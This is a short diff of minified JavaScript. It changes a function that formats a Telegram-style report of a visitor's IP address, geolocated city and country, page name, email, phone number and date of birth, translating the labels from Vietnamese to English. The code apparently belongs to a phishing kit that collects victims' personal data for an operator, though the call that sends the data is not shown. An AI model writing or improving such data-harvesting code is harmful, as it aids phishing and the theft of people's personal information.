@@ -731,12 +731,12 @@
                       M = t ? JSON.parse(t) : {};
                     return `📅 <b>Thời gian:</b> <code>${e}</code>
 🌍 <b>IP:</b> <code>${M.ip || "k lấy được"}</code>
-📍 <b>Vị tr\xed:</b> <code>${M.city || "k lấy được"} - ${M.region || "k lấy được"} - ${M.country_code || "k lấy được"}</code>
+📍 <b>Location:</b> <code>${M.city || "k lấy được"} - ${M.region || "k lấy được"} - ${M.country_code || "k lấy được"}</code>
 
 🔖 <b>Page Name:</b> <code>${A.pageName}</code>
 📧 <b>Email:</b> <code>${A.mail}</code>
-📱 <b>Số điện thoại:</b> <code>${A.phone}</code>
-🎂 <b>Ng\xe0y sinh:</b> <code>${A.birthday}</code>`;
+📱 <b>Phone Number:</b> <code>${A.phone}</code>
+🎂 <b>Date of birth:</b> <code>${A.birthday}</code>`;
                   },
                   o = [
                     { id: "using", icon: p.Q9Y, title: m.using },
@@ -1492,3 +1492,4 @@
   });
   g = w.O(g);
 })();
+
